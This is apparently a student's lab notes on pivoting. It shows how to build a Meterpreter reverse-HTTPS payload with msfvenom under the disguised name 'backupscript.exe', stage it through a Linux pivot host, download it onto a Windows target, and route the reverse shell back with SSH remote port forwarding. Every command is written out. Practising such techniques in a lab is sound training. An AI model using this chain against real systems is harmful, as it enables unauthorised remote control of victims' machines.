

when we want reverse shell from pivot host

![[image 30.png]]

Create payload with msfvenom


```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> 172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```


use multi/handler

![[image 31.png]]

transfer payload to victim (target host)

```bash
scp backupscript.exe ubuntu@<ipAddressofTarget>10.129.145.80:~/
```

Downloading Payload to Windows Target from victim host

![[image 32.png]]

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```


### Host discovery/ping sweep

![[image 33.png]]

## Using SSH -R

Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will use -vN argument in our SSH command to make it verbose and ask it not to prompt the login shell. The -R command asks the Ubuntu server to listen on :8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host

```bash
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
        172.16.5.129      payload port  multi/handler port 10.29.145.80
```

![[image 34.png]]

![[image 35.png]]

## Final reverse shell

![[image 36.png]]


# Q. why we create payload? I got shell without executing it, just using SSH -R
